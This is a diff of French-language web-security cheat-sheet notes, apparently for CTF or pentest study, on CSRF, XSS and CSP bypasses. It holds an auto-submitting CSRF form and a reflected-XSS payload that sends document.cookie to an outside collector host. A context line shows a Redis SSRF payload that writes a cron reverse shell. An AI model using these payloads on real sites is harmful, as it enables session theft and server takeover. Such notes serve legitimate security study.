@@ -510,6 +510,17 @@ dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port
 - https://n-pn.fr/t/1277-tout-sur-les-attack-csrf---cross-site-request-forgery
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection
 
+```html
+<form id="autosubmit" action="/api/setusername"  method="POST">
+ <input name="username" type="hidden" value="CSRFd" />
+ <input type="submit" value="Submit Request" />
+</form>
+ 
+<script>
+ document.getElementById("autosubmit").submit();
+</script>
+```
+
 `Protection:`
 
 - anti-CSRF tokens
@@ -539,33 +550,33 @@ Header Set-Cookie: mettre le scope de l'attribut SameSite = None
  - https://github.com/payloadbox/xss-payload-list
  - https://github.com/cure53/HTTPLeaks/tree/main
  - https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-script-code
- - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#filter-bypass-and-exotic-payloads
+ - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md
 
 `Protection`: HTML-encode les entrées utilisateurs, CSP
 
-`Reflected XSS : Report`
+#### Reflected XSS
 
 ```html
-https://vulnerable.org?parameter=<img src="//night.free.beeceptor.com?data=".concat(document.cookie)>
+# reflection in paramter, reporting url to the bot
+https://vulnerable.org?parameter=<img src=x onerror="//night.free.beeceptor.com?data=".concat(document.cookie)>
 ```
 
-[Dom Based XSS](https://blog.cyxo.re/pwnme-2022/pimp-my-bicycle/)
+#### Dom based XSS
 
-- appel ou accès aux éléments du DOM (ex document.getElementByID)
-- accès aux erreurs
+- https://blog.cyxo.re/pwnme-2022/pimp-my-bicycle/
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#dom-based-xss
 
 ![console](./images/console.png)
 
 ### CSP
 
-[CSP Bypass](https://csplite.com/csp320/)
-
+- https://csplite.com/csp320/
 - https://content-security-policy.com/
 - https://csp-evaluator.withgoogle.com/
 - https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection
 - https://www.cobalt.io/blog/csp-and-bypasses
 - https://chromestatus.com/feature/5735596811091968
-
+  
 rappel
 
 ```js
